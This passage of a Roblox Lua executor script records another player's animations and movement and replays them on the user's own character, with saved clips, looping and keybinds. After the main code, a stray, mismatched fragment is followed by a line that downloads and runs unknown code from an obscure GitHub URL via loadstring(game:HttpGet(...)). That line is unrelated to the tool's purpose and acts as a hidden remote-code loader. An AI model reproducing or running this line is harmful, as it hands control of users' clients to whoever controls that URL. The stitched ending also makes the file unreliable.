    ClipsCorner.Parent = ClipsScrollFrame
    
    local ClipsList = Instance.new("UIListLayout")
    ClipsList.Padding = UDim.new(0, 5)
    ClipsList.SortOrder = Enum.SortOrder.LayoutOrder
    ClipsList.Parent = ClipsScrollFrame
    
    local ClipsPadding = Instance.new("UIPadding")
    ClipsPadding.PaddingLeft = UDim.new(0, 5)
    ClipsPadding.PaddingRight = UDim.new(0, 5)
    ClipsPadding.PaddingTop = UDim.new(0, 5)
    ClipsPadding.PaddingBottom = UDim.new(0, 5)
    ClipsPadding.Parent = ClipsScrollFrame
    
    -- Set parent
    GUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    return {
        MainFrame = DraggableFrame,
        TitleBar = TitleBar,
        CloseButton = CloseButton,
        SearchBox = SearchBox,
        DropdownFrame = DropdownFrame,
        RecordButton = RecordButton,
        StatusLabel = StatusLabel,
        ClipsScrollFrame = ClipsScrollFrame
    }
end

-- Make Frame Draggable
local function MakeDraggable(frame, dragui)
    local dragging = false
    local dragStart, frameStart
    
    dragui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            frameStart = frame.Position
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                frameStart.X.Scale, 
                frameStart.X.Offset + delta.X,
                frameStart.Y.Scale, 
                frameStart.Y.Offset + delta.Y
            )
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

-- Find player function
local function FindPlayer(searchText)
    if searchText == "" then return {} end
    
    local results = {}
    for _, player in pairs(Players:GetPlayers()) do
        if string.lower(player.Name):find(string.lower(searchText)) then
            table.insert(results, player)
        elseif string.lower(player.DisplayName):find(string.lower(searchText)) then
            table.insert(results, player)
        end
        
        if #results >= 5 then
            break
        end
    end
    
    return results
end

-- Update dropdown with search results
local function UpdateDropdown(guiElements, results)
    local dropdown = guiElements.DropdownFrame
    
    for _, child in pairs(dropdown:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    if #results == 0 then
        dropdown.Visible = false
        dropdown.Size = UDim2.new(1, 0, 0, 0)
        return
    end
    
    for i, player in ipairs(results) do
        local button = Instance.new("TextButton")
        button.Name = "Result" .. i
        button.Size = UDim2.new(1, 0, 0, 30)
        button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        button.BorderSizePixel = 0
        button.Font = Enum.Font.Gotham
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextSize = 14
        button.Text = player.DisplayName .. " (@" .. player.Name .. ")"
        button.ZIndex = 5
        button.Parent = dropdown
        
        button.MouseEnter:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        end)
        
        button.MouseButton1Click:Connect(function()
            SelectedPlayer = player
            guiElements.SearchBox.Text = player.DisplayName .. " (@" .. player.Name .. ")"
            dropdown.Visible = false
            guiElements.StatusLabel.Text = "Ready to record " .. player.DisplayName .. "'s animations"
        end)
    end
    
    dropdown.Size = UDim2.new(1, 0, 0, 30 * #results)
    dropdown.Visible = true
end

-- Generate clip name with auto-incrementing number for duplicates
local function GenerateClipName(playerName)
    local baseName = playerName .. "'s clip"
    local highestNumber = 0
    
    for _, clip in ipairs(SavedClips) do
        if clip.PlayerName == playerName then
            local clipNumber = clip.Name:match(baseName .. " (%d+)")
            if clipNumber then
                clipNumber = tonumber(clipNumber)
                if clipNumber and clipNumber > highestNumber then
                    highestNumber = clipNumber
                end
            end
        end
    end
    
    if highestNumber == 0 then
        return baseName .. " 1"
    else
        return baseName .. " " .. (highestNumber + 1)
    end
end

-- Start tracking animations of a player
local function StartTrackingAnimations(player)
    if not player then return end
    
    local character = player.Character
    if not character then
        player.CharacterAdded:Wait()
        character = player.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local animator = humanoid:WaitForChild("Animator")
    
    TrackingAnimations = true
    AnimationTracks = {}
    
    local clipName = GenerateClipName(player.Name)
    
    CurrentClip = {
        Name = clipName,
        PlayerName = player.Name,
        Events = {},
        StartTime = tick(),
        InitialCFrame = character:GetPivot(),
        InitialCameraCFrame = workspace.CurrentCamera.CFrame
    }
    
    local function TrackCharacterTransform()
        local currentTime = tick() - CurrentClip.StartTime
        local currentCFrame = character:GetPivot()
        
        table.insert(CurrentClip.Events, {
            Type = "Transform",
            Time = currentTime,
            CFrame = currentCFrame,
            LookVector = currentCFrame.LookVector
        })
    end
    
    local equippedTool = nil
    
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item.Parent == character then
            equippedTool = item
            break
        end
    end
    
    local toolConnection = character.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then
            equippedTool = child
        end
    end)
    
    local toolRemovedConnection = character.ChildRemoved:Connect(function(child)
        if child:IsA("Tool") and child == equippedTool then
            equippedTool = nil
        end
    end)
    
    local function UpdateAnimationTracks()
        local tracks = animator:GetPlayingAnimationTracks()
        local currentTime = tick() - CurrentClip.StartTime
        
        for _, track in pairs(tracks) do
            local trackId = track.Animation.AnimationId
            
            local skipTrack = false
            if equippedTool then
                if trackId:match("tool") or trackId:match("equip") or trackId:match("weapon") then
                    skipTrack = true
                end
            end
            
            if not skipTrack then
                if not AnimationTracks[trackId] or AnimationTracks[trackId].Stopped then
                    AnimationTracks[trackId] = {
                        Track = track,
                        Stopped = false,
                        StartTime = currentTime,
                        LastTimePosition = track.TimePosition,
                        LastUpdateTime = currentTime
                    }
                    
                    table.insert(CurrentClip.Events, {
                        Type = "Start",
                        AnimationId = trackId,
                        Time = currentTime,
                        Speed = track.Speed,
                        Weight = track.WeightCurrent,
                        TimePosition = track.TimePosition
                    })
                else
                    local expectedPosition = AnimationTracks[trackId].LastTimePosition + 
                        (currentTime - AnimationTracks[trackId].LastUpdateTime) * track.Speed
                    
                    if math.abs(track.TimePosition - expectedPosition) > 0.1 then
                        table.insert(CurrentClip.Events, {
                            Type = "TimeJump",
                            AnimationId = trackId,
                            Time = currentTime,
                            PreviousPosition = AnimationTracks[trackId].LastTimePosition,
                            NewPosition = track.TimePosition
                        })
                    end
                    
                    if math.abs(track.Speed - AnimationTracks[trackId].Track.Speed) > 0.01 then
                        table.insert(CurrentClip.Events, {
                            Type = "Speed",
                            AnimationId = trackId,
                            Time = currentTime,
                            Speed = track.Speed
                        })
                    end
                    
                    if math.abs(track.WeightCurrent - AnimationTracks[trackId].Track.WeightCurrent) > 0.01 then
                        table.insert(CurrentClip.Events, {
                            Type = "Weight",
                            AnimationId = trackId,
                            Time = currentTime,
                            Weight = track.WeightCurrent
                        })
                    end
                    
                    AnimationTracks[trackId].Track = track
                    AnimationTracks[trackId].LastTimePosition = track.TimePosition
                    AnimationTracks[trackId].LastUpdateTime = currentTime
                end
            end
        end
        
        for id, data in pairs(AnimationTracks) do
            if not data.Stopped then
                local stillPlaying = false
                
                for _, track in pairs(tracks) do
                    if track.Animation.AnimationId == id then
                        stillPlaying = true
                        break
                    end
                end
                
                if not stillPlaying then
                    data.Stopped = true
                    
                    table.insert(CurrentClip.Events, {
                        Type = "Stop",
                        AnimationId = id,
                        Time = currentTime,
                        FinalPosition = data.LastTimePosition
                    })
                end
            end
        end
    end
    
    LastAnimationTime = tick()
    
    local trackingLoop = task.spawn(function()
        while TrackingAnimations do
            UpdateAnimationTracks()
            TrackCharacterTransform()
            task.wait(0.03)
        end
        
        toolConnection:Disconnect()
        toolRemovedConnection:Disconnect()
    end)
end

-- Stop tracking animations
local function StopTrackingAnimations()
    TrackingAnimations = false
    
    if CurrentClip and #CurrentClip.Events > 0 then
        CurrentClip.Duration = tick() - CurrentClip.StartTime
        
        CurrentClip.Id = HttpService:GenerateGUID(false)
        
        table.insert(SavedClips, CurrentClip)
        
        SaveClipsToFile()
        
        return true
    end
    
    return false
end

-- Play an animation clip on local character
local function PlayClip(clip, loop)
    if CurrentStopFunc then
        CurrentStopFunc()
        CurrentStopFunc = nil
    end
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:WaitForChild("Humanoid")
    local animator = humanoid:WaitForChild("Animator")
    
    local originalCFrame = character:GetPivot()
    local originalLookVector = originalCFrame.LookVector
    
    for _, track in pairs(animator:GetPlayingAnimationTracks()) do
        track:Stop()
    end
    
    local clipTracks = {}
    CurrentlyPlayingClip = clip.Id
    
    local function PlayClipOnce()
        local startTime = tick()
        local eventsProcessed = {}
        
        local connection
        connection = RunService.Heartbeat:Connect(function()
            local elapsed = tick() - startTime
            
            if elapsed > clip.Duration and not loop then
                connection:Disconnect()
                
                for _, trackData in pairs(clipTracks) do
                    if trackData.Track and trackData.Track.IsPlaying then
                        trackData.Track:Stop()
                    end
                end
                
                if CurrentlyPlayingClip == clip.Id then
                    CurrentlyPlayingClip = nil
                    for _, child in pairs(GUI.MainFrame.ContentFrame.ClipsSection.ClipsScrollFrame:GetChildren()) do
                        if child:IsA("Frame") and child.Name == "Clip_" .. clip.Id then
                            local playButton = child.Actions.PlayButton
                            playButton.Text = "PLAY"
                            playButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
                            break
                        end
                    end
                end
                
                return
            end
            
            if loop and elapsed > clip.Duration then
                startTime = tick()
                table.clear(eventsProcessed)
                elapsed = 0
                
                for _, trackData in pairs(clipTracks) do
                    if trackData.Track and trackData.Track.IsPlaying then
                        trackData.Track:Stop()
                    end
                end
            end
            
            for i, event in ipairs(clip.Events) do
                if not eventsProcessed[i] and elapsed >= event.Time then
                    eventsProcessed[i] = true
                    
                    if event.Type == "Start" then
                        local animation = Instance.new("Animation")
                        animation.AnimationId = event.AnimationId
                        
                        local track = animator:LoadAnimation(animation)
                        track:AdjustSpeed(event.Speed)
                        
                        if event.TimePosition then
                            track.TimePosition = event.TimePosition
                        end
                        
                        track:Play()
                        
                        clipTracks[event.AnimationId] = {
                            Track = track,
                            Animation = animation
                        }
                        
                    elseif event.Type == "Stop" then
                        if clipTracks[event.AnimationId] and clipTracks[event.AnimationId].Track then
                            clipTracks[event.AnimationId].Track:Stop()
                        end
                        
                    elseif event.Type == "Speed" then
                        if clipTracks[event.AnimationId] and clipTracks[event.AnimationId].Track then
                            clipTracks[event.AnimationId].Track.Speed = event.Speed
                        end
                        
                    elseif event.Type == "Weight" then
                        if clipTracks[event.AnimationId] and clipTracks[event.AnimationId].Track then
                            clipTracks[event.AnimationId].Track.WeightTarget = event.Weight
                        end
                        
                    elseif event.Type == "TimeJump" then
                        if clipTracks[event.AnimationId] and clipTracks[event.AnimationId].Track then
                            clipTracks[event.AnimationId].Track.TimePosition = event.NewPosition
                        end
                    elseif event.Type == "Transform" then
                        if event.LookVector then
                            local recordedLookVec = event.LookVector
                            local initialLookVec = clip.InitialCFrame.LookVector
                            
                            local angle = math.atan2(
                                recordedLookVec.X - initialLookVec.X,
                                recordedLookVec.Z - initialLookVec.Z
                            )
                            
                            local currentPos = originalCFrame.Position
                            local rotatedLookVec = CFrame.Angles(0, angle, 0) * originalLookVector
                            
                            local newOrientation = CFrame.new(
                                currentPos,
                                currentPos + rotatedLookVec
                            )
                            
                            local rootPart = character:FindFirstChild("HumanoidRootPart")
                            if rootPart then
                                rootPart.CFrame = CFrame.new(rootPart.Position) * (newOrientation - newOrientation.Position)
                            end
                        end
                    end
                end
            end
        end)
        
        return connection
    end
    
    local playConnection = PlayClipOnce()
    
    return function()
        if playConnection then
            playConnection:Disconnect()
        end
        
        CurrentlyPlayingClip = nil
        
        for _, trackData in pairs(clipTracks) do
            if trackData.Track and trackData.Track.IsPlaying then
                trackData.Track:Stop()
            end
        end
    end
end

-- Create a clip entry for the UI
local function CreateClipEntry(guiElements, clip, index)
    local clipFrame = Instance.new("Frame")
    clipFrame.Name = "Clip_" .. clip.Id
    clipFrame.Size = UDim2.new(1, 0, 0, 80)
    clipFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    clipFrame.BorderSizePixel = 0
    clipFrame.LayoutOrder = index
    
    local clipCorner = Instance.new("UICorner")
    clipCorner.CornerRadius = UDim.new(0, 5)
    clipCorner.Parent = clipFrame
    
    local clipHeader = Instance.new("Frame")
    clipHeader.Name = "Header"
    clipHeader.Size = UDim2.new(1, 0, 0, 30)
    clipHeader.BackgroundTransparency = 1
    clipHeader.Parent = clipFrame
    
    local nameBox = Instance.new("TextBox")
    nameBox.Name = "NameBox"
    nameBox.Size = UDim2.new(1, -110, 1, 0)
    nameBox.Position = UDim2.new(0, 5, 0, 0)
    nameBox.BackgroundTransparency = 1
    nameBox.Font = Enum.Font.GothamBold
    nameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameBox.TextSize = 14
    nameBox.Text = clip.Name
    nameBox.TextXAlignment = Enum.TextXAlignment.Left
    nameBox.ClearTextOnFocus = false
    nameBox.Parent = clipHeader
    
    local durationLabel = Instance.new("TextLabel")
    durationLabel.Name = "Duration"
    durationLabel.Size = UDim2.new(0, 100, 1, 0)
    durationLabel.Position = UDim2.new(1, -105, 0, 0)
    durationLabel.BackgroundTransparency = 1
    durationLabel.Font = Enum.Font.Gotham
    durationLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    durationLabel.TextSize = 12
    durationLabel.Text = string.format("%.1fs", clip.Duration or 0)
    durationLabel.Parent = clipHeader
    
    local actionsFrame = Instance.new("Frame")
    actionsFrame.Name = "Actions"
    actionsFrame.Size = UDim2.new(1, 0, 0, 40)
    actionsFrame.Position = UDim2.new(0, 0, 0, 35)
    actionsFrame.BackgroundTransparency = 1
    actionsFrame.Parent = clipFrame
    
    local playButton = Instance.new("TextButton")
    playButton.Name = "PlayButton"
    playButton.Size = UDim2.new(0.23, 0, 0, 30)
    playButton.Position = UDim2.new(0, 5, 0, 0)
    playButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
    playButton.Font = Enum.Font.GothamBold
    playButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    playButton.TextSize = 12
    playButton.Text = "PLAY"
    playButton.Parent = actionsFrame
    
    local playCorner = Instance.new("UICorner")
    playCorner.CornerRadius = UDim.new(0, 5)
    playCorner.Parent = playButton
    
    local loopButton = Instance.new("TextButton")
    loopButton.Name = "LoopButton"
    loopButton.Size = UDim2.new(0.23, 0, 0, 30)
    loopButton.Position = UDim2.new(0.25, 5, 0, 0)
    loopButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    loopButton.Font = Enum.Font.GothamBold
    loopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    loopButton.TextSize = 12
    loopButton.Text = "LOOP"
    loopButton.Parent = actionsFrame
    
    local loopCorner = Instance.new("UICorner")
    loopCorner.CornerRadius = UDim.new(0, 5)
    loopCorner.Parent = loopButton
    
    local keybindButton = Instance.new("TextButton")
    keybindButton.Name = "KeybindButton"
    keybindButton.Size = UDim2.new(0.23, 0, 0, 30)
    keybindButton.Position = UDim2.new(0.5, 5, 0, 0)
    keybindButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    keybindButton.Font = Enum.Font.GothamBold
    keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    keybindButton.TextSize = 12
    keybindButton.Text = "KEYBIND"
    keybindButton.Parent = actionsFrame
    
    local keybindCorner = Instance.new("UICorner")
    keybindCorner.CornerRadius = UDim.new(0, 5)
    keybindCorner.Parent = keybindButton
    
    local deleteButton = Instance.new("TextButton")
    deleteButton.Name = "DeleteButton"
    deleteButton.Size = UDim2.new(0.23, 0, 0, 30)
    deleteButton.Position = UDim2.new(0.75, 5, 0, 0)
    deleteButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    deleteButton.Font = Enum.Font.GothamBold
    deleteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    deleteButton.TextSize = 12
    deleteButton.Text = "DELETE"
    deleteButton.Parent = actionsFrame
    
    local deleteCorner = Instance.new("UICorner")
    deleteCorner.CornerRadius = UDim.new(0, 5)
    deleteCorner.Parent = deleteButton
    
    local stopFunc = nil
    
    playButton.MouseButton1Click:Connect(function()
        if stopFunc then
            stopFunc()
            stopFunc = nil
            playButton.Text = "PLAY"
            playButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
            return
        end
        
        local isLooping = LoopingClips[clip.Id] or false
        
        stopFunc = PlayClip(clip, isLooping)
        CurrentStopFunc = stopFunc
        playButton.Text = "STOP"
        playButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    end)
    
    loopButton.MouseButton1Click:Connect(function()
        LoopingClips[clip.Id] = not LoopingClips[clip.Id]
        
        if LoopingClips[clip.Id] then
            loopButton.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
        else
            loopButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        end
    end)
    
    keybindButton.MouseButton1Click:Connect(function()
        if KeyBinds[clip.Id] then
            KeyBinds[clip.Id] = nil
            keybindButton.Text = "KEYBIND"
            keybindButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
            return
        end
        
        keybindButton.Text = "PRESS KEY"
        keybindButton.BackgroundColor3 = Color3.fromRGB(180, 180, 60)
        
        local connection
        connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            
            if input.UserInputType == Enum.UserInputType.Keyboard then
                KeyBinds[clip.Id] = input.KeyCode
                keybindButton.Text = input.KeyCode.Name
                keybindButton.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
                
                SaveKeybinds()
                
                connection:Disconnect()
            end
        end)
    end)
    
    deleteButton.MouseButton1Click:Connect(function()
        if CurrentlyPlayingClip == clip.Id and CurrentStopFunc then
            CurrentStopFunc()
            CurrentStopFunc = nil
            CurrentlyPlayingClip = nil
        end
        
        for i, savedClip in ipairs(SavedClips) do
            if savedClip.Id == clip.Id then
                table.remove(SavedClips, i)
                break
            end
        end
        
        KeyBinds[clip.Id] = nil
        LoopingClips[clip.Id] = nil
        
        clipFrame:Destroy()
        
        UpdateClipsCanvasSize(guiElements)
        
        SaveClipsToFile()
        SaveKeybinds()
    end)
    
    nameBox.FocusLost:Connect(function(enterPressed)
        for i, savedClip in ipairs(SavedClips) do
            if savedClip.Id == clip.Id then
                SavedClips[i].Name = nameBox.Text
                break
            end
        end
        
        SaveClipsToFile()
    end)
    
    if LoopingClips[clip.Id] then
        loopButton.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
    end
    
    if KeyBinds[clip.Id] then
        keybindButton.Text = KeyBinds[clip.Id].Name
        keybindButton.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
    end
    
    clipFrame.Parent = guiElements.ClipsScrollFrame
    return clipFrame
end

-- Update the canvas size of the clips scrolling frame
function UpdateClipsCanvasSize(guiElements)
    local scrollFrame = guiElements.ClipsScrollFrame
    local contentSize = scrollFrame.UIListLayout.AbsoluteContentSize.Y
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, contentSize + 10)
end

-- Save clips to file
function SaveClipsToFile()
    local success, errorMsg = pcall(function()
        local saveData = {
            Clips = SavedClips,
            Version = 1
        }
        
        local jsonData = HttpService:JSONEncode(saveData)
        
        if not isfolder(ClipsFolder) then
            makefolder(ClipsFolder)
        end
        
        writefile(ClipsFolder .. "/" .. SaveFileName, jsonData)
    end)
    
    if not success then
        warn("Failed to save clips: " .. errorMsg)
    end
end

-- Save keybinds to file
function SaveKeybinds()
    local success, errorMsg = pcall(function()
        local keybindData = {}
        for id, keyCode in pairs(KeyBinds) do
            keybindData[id] = keyCode.Name
        end
        
        local saveData = {
            KeyBinds = keybindData,
            LoopingClips = LoopingClips,
            Version = 1
        }
        
        local jsonData = HttpService:JSONEncode(saveData)
        
        if not isfolder(ClipsFolder) then
            makefolder(ClipsFolder)
        end
        
        writefile(ClipsFolder .. "/Keybinds_" .. LocalPlayer.UserId .. ".json", jsonData)
    end)
    
    if not success then
        warn("Failed to save keybinds: " .. errorMsg)
    end
end

-- Load clips from file
local function LoadClipsFromFile()
    local success, result = pcall(function()
        if not isfolder(ClipsFolder) then
            makefolder(ClipsFolder)
            return false
        end
        
        if not isfile(ClipsFolder .. "/" .. SaveFileName) then
            return false
        end
        
        local jsonData = readfile(ClipsFolder .. "/" .. SaveFileName)
        local saveData = HttpService:JSONDecode(jsonData)
        
        if saveData and saveData.Clips then
            SavedClips = saveData.Clips
            return true
        end
        
        return false
    end)
    
    if not success or result == false then
        SavedClips = {}
    end
end

-- Load keybinds from file
local function LoadKeybinds()
    local success, result = pcall(function()
        if not isfolder(ClipsFolder) then
            makefolder(ClipsFolder)
            return false
        end
        
        local keybindFileName = ClipsFolder .. "/Keybinds_" .. LocalPlayer.UserId .. ".json"
        if not isfile(keybindFileName) then
            return false
        end
        
        local jsonData = readfile(keybindFileName)
        local saveData = HttpService:JSONDecode(jsonData)
        
        if saveData then
            for id, keyName in pairs(saveData.KeyBinds) do
                KeyBinds[id] = Enum.KeyCode[keyName]
            end
            
            LoopingClips = saveData.LoopingClips
            
            return true
        end
        
        return false
    end)
    
    if not success or result == false then
        KeyBinds = {}
        LoopingClips = {}
    end
end

-- Initialize the UI and functionality
local function Initialize()
    local guiElements = CreateGUI()
    
    MakeDraggable(guiElements.MainFrame, guiElements.TitleBar)
    
    guiElements.CloseButton.MouseButton1Click:Connect(function()
        GUI:Destroy()
    end)
    
    guiElements.SearchBox.Changed:Connect(function(property)
        if property == "Text" then
            local results = FindPlayer(guiElements.SearchBox.Text)
            UpdateDropdown(guiElements, results)
        end
    end)
    
    guiElements.SearchBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            local results = FindPlayer(guiElements.SearchBox.Text)
            if #results == 1 then
                SelectedPlayer = results[1]
                guiElements.SearchBox.Text = results[1].DisplayName .. " (@" .. results[1].Name .. ")"
                guiElements.DropdownFrame.Visible = false
                guiElements.StatusLabel.Text = "Ready to record " .. results[1].DisplayName .. "'s animations"
            end
        end
    end)
    
    guiElements.RecordButton.MouseButton1Click:Connect(function()
        if RecordingClip then
            RecordingClip = false
            guiElements.RecordButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
            guiElements.RecordButton.Text = "START RECORDING"
            
            local clipSaved = StopTrackingAnimations()
            
            if clipSaved then
                guiElements.StatusLabel.Text = "Clip saved"
                
                local newClip = SavedClips[#SavedClips]
                CreateClipEntry(guiElements, newClip, #SavedClips)
                
                UpdateClipsCanvasSize(guiElements)
            else
                guiElements.StatusLabel.Text = "Recording canceled (no animations recorded)"
            end
        else
            if not SelectedPlayer then
                guiElements.StatusLabel.Text = "Please select a player first"
                return
            end
            
            RecordingClip = true
            guiElements.RecordButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
            guiElements.RecordButton.Text = "STOP RECORDING"
            guiElements.StatusLabel.Text = "Recording " .. SelectedPlayer.DisplayName .. "'s animations..."
            
            StartTrackingAnimations(SelectedPlayer)
        end
    end)
    
    LoadClipsFromFile()
    LoadKeybinds()
    
    for i, clip in ipairs(SavedClips) do
        CreateClipEntry(guiElements, clip, i)
    end
    
    UpdateClipsCanvasSize(guiElements)
    
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.UserInputType == Enum.UserInputType.Keyboard then
            for clipId, keyCode in pairs(KeyBinds) do
                if keyCode == input.KeyCode then
                    local clipToPlay = nil
                    for _, clip in ipairs(SavedClips) do
                        if clip.Id == clipId then
                            clipToPlay = clip
                            break
                        end
                    end
                    
                    if clipToPlay then
                        local isLooping = LoopingClips[clipId] or false
                        
                        if CurrentlyPlayingClip == clipId and CurrentStopFunc then
                            CurrentStopFunc()
                            CurrentStopFunc = nil
                            CurrentlyPlayingClip = nil
                            
                            for _, child in pairs(GUI.MainFrame.ContentFrame.ClipsSection.ClipsScrollFrame:GetChildren()) do
                                if child:IsA("Frame") and child.Name == "Clip_" .. clipId then
                                    local playButton = child.Actions.PlayButton
                                    playButton.Text = "PLAY"
                                    playButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
                                    break
                                end
                            end
                        else
                            if CurrentStopFunc then
                                CurrentStopFunc()
                                CurrentStopFunc = nil
                                
                                if CurrentlyPlayingClip then
                                    for _, child in pairs(GUI.MainFrame.ContentFrame.ClipsSection.ClipsScrollFrame:GetChildren()) do
                                        if child:IsA("Frame") and child.Name == "Clip_" .. CurrentlyPlayingClip then
                                            local playButton = child.Actions.PlayButton
                                            playButton.Text = "PLAY"
                                            playButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
                                            break
                                        end
                                    end
                                end
                            end
                            
                            CurrentStopFunc = PlayClip(clipToPlay, isLooping)
                            
                            for _, child in pairs(GUI.MainFrame.ContentFrame.ClipsSection.ClipsScrollFrame:GetChildren()) do
                                if child:IsA("Frame") and child.Name == "Clip_" .. clipId then
                                    local playButton = child.Actions.PlayButton
                                    playButton.Text = "STOP"
                                    playButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    
    guiElements.StatusLabel.Text = "Ready to record"
end

-- Run the script
Initialize()

LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    Character = newCharacter
    Humanoid = Character:WaitForChild("Humanoid")
    Animator = Humanoid:WaitForChild("Animator")
end)

   end,
})
loadstring(game:HttpGet("https://raw.githubusercontent.com/sentinelso8urcecodesq23e123/ownercmds/refs/heads/main/adada"))()
